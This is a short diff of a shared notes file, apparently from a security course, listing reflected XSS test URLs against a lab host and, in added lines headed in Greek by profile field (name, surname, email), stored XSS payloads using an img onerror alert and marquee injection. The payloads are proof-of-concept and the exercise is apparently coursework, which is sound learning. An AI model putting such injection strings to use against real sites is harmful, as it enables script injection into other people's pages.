@@ -1,4 +1,4 @@
--------------------------------------CRISS
+------------------------------------------- CRISS
 
 http://kalashnik0v.csec.chatzi.org/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 http://kalashnik0v.csec.chatzi.org/modules/auth/courses.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
@@ -25,6 +25,13 @@ http://kalashnik0v.csec.chatzi.org/modules/contact/index.php/'%22%22%3E%3Cscript
 ******* -> kalashnik0v.csec.chatzi.org/modules/learnPath/navigation/showExercise.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 
 
+Αλλαγή ονόματος
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+'">><marquee><h1>XSS</h1></marquee>
 
+Αλλαγή επιθέτου 
+'">><marquee><h1>XSS</h1></marquee>
 
-
+Αλλαγή email
+'">><marquee><h1>XSS</h1></marquee>
+------------------------------------------- THANOS
